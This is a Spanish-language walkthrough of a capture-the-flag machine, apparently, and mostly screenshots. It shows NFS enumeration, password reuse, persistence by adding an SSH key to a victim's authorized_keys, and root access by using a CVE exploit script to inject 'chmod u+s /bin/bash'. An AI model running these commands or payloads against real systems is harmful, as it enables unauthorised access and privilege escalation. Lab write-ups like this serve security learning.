# Enumeración

<img width="966" height="821" alt="image" src="https://github.com/user-attachments/assets/3aa49445-c487-4148-b38b-f24741e0d329" />


# SHOWMOUNT

<img width="287" height="88" alt="image" src="https://github.com/user-attachments/assets/d96a3620-81e3-4510-8726-fe876bb1a514" />


<img width="508" height="64" alt="image" src="https://github.com/user-attachments/assets/9e457f20-6f12-4200-a77b-c072126237d8" />

<img width="236" height="61" alt="image" src="https://github.com/user-attachments/assets/6152cd83-be92-4c71-9461-a69f7f0c1d77" />

<img width="719" height="674" alt="image" src="https://github.com/user-attachments/assets/edb799ef-824b-422e-ae77-10890e1080fa" />

Entramos con las credenciales 
<img width="956" height="472" alt="image" src="https://github.com/user-attachments/assets/2a50c1d1-ecb3-4bcb-b0c9-86f672063914" />
Reusamos el password en Sarah
Versión vulnerable
````
https://github.com/BridgerAlderson/CVE-2025-69212-PoC
````
<img width="888" height="665" alt="image" src="https://github.com/user-attachments/assets/8340b339-48c4-4ae3-a5ac-767804672a55" />

Tenemos password
<img width="754" height="507" alt="image" src="https://github.com/user-attachments/assets/e2bd2d2b-7508-4418-8b5e-2781be864859" />
Mirando por la DB:
<img width="813" height="263" alt="image" src="https://github.com/user-attachments/assets/288f24f9-326d-48e4-b0d5-fb117bcc82f7" />

# USER
<img width="558" height="433" alt="image" src="https://github.com/user-attachments/assets/47302370-f394-48ca-9a86-51a189dcaca6" />
Hay un puesro que solo se ve internamente el 
<img width="779" height="812" alt="image" src="https://github.com/user-attachments/assets/ed5c72ca-1cf4-433d-979a-89f5fd23cf2f" />

CREAMOS SSH para hacer puente:
<img width="945" height="133" alt="image" src="https://github.com/user-attachments/assets/c843f597-3a6d-440e-a3c2-71d9e1670d56" />

````
# 1. KALI: genera clave
ssh-keygen -t ed25519 -f ~/.ssh/haris_key -N ""
cat ~/.ssh/haris_key.pub

# 2. VÍCTIMA (como haris): pega la pública
mkdir -p ~/.ssh && chmod 700 ~/.ssh
echo 'PEGA_LA_PUBLICA' >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys

# 3. KALI: entra
ssh -i ~/.ssh/haris_key haris@IP
````
<img width="902" height="105" alt="image" src="https://github.com/user-attachments/assets/86cec668-136c-4962-b14f-22c1a862fdc8" />

<img width="1919" height="998" alt="image" src="https://github.com/user-attachments/assets/2fc53577-4389-439a-aee3-b78f21f26d44" />

<img width="676" height="264" alt="image" src="https://github.com/user-attachments/assets/d45ef9ef-3048-4a15-b5e5-6bea2ad44b7e" />

Conseguimos root 

<img width="891" height="59" alt="image" src="https://github.com/user-attachments/assets/1bccf5fd-5537-4cf2-bb2a-a4ac77894dc0" />

ponemos com suid bash:
````
python3 CVE-2026.27626.py -u http://127.0.0.1 -p 1337 -x "chmod u+s /bin/bash"
[+] Execution ID: b4b3f20a-18ab-4651-a5aa-cf58082dd9bc
======================================================================
Command Output
======================================================================
exit status 2

Usage: mysqldump [OPTIONS] database [tables]
OR     mysqldump [OPTIONS] --databases [OPTIONS] DB1 [DB2 DB3...]
OR     mysqldump [OPTIONS] --all-databases [OPTIONS]
For more options, use mysqldump --help
sh: 1: cannot create /opt/backups/backup.sql: Directory nonexistent
======================================================================
                                                                                                                    

````
Desde el kali: 
````
bash -p
````
<img width="657" height="151" alt="image" src="https://github.com/user-attachments/assets/cf24017f-bde4-4dd9-ad17-d1d2e547ecc7" />



